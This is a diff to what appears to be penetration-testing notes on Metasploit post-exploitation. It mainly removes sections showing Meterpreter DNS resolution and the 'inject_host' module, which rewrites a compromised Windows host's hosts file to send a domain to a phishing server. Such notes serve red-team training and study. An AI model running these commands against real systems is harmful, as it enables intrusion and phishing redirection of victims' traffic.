@@ -386,7 +386,7 @@ IPv4 network routes
 No IPv6 routes were found.
 ```
 
-* Proxy
+Proxy
 
 ```
 meterpreter > getproxy
@@ -394,54 +394,6 @@ Auto-detect     : Yes
 Auto config URL :
 Proxy URL       :
 Proxy Bypass    :
-```
-
-* Resolve DNS
-
-```
-meterpreter > resolve -h
-Usage: resolve host1 host2 .. hostN [-h] [-f IPv4|IPv6]
-
-
-OPTIONS:
-
-    -f   Address family - IPv4 or IPv6 (default IPv4)
-    -h   Help banner.
-
-meterpreter > resolve <computer_name> -f <IPv4 | IPv6>
-
-meterpreter > resolve 10.0.2.3
-
-Host resolutions
-================
-
-    Hostname  IP Address
-    --------  ----------
-    10.0.2.3  10.0.2.3
-```
-
-* Inject DNS Hosts
-
-```
-msf > use post/windows/manage/inject_host
-
-msf post(windows/manage/inject_host) > options
-
-Module options (post/windows/manage/inject_host):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   DOMAIN                    yes       Domain name for host file manipulation.
-   IP                        yes       IP address to point domain name to.
-   SESSION                   yes       The session to run this module on
-
-msf post(windows/manage/inject_host) > set domain <domain>
-
-msf post(windows/manage/inject_host) > set ip <phishing_server>
-
-msf post(windows/manage/inject_host) > set session <session_ID>
-
-msf post(windows/manage/inject_host) > run
 ```
 
 ## 3.4 - Registry
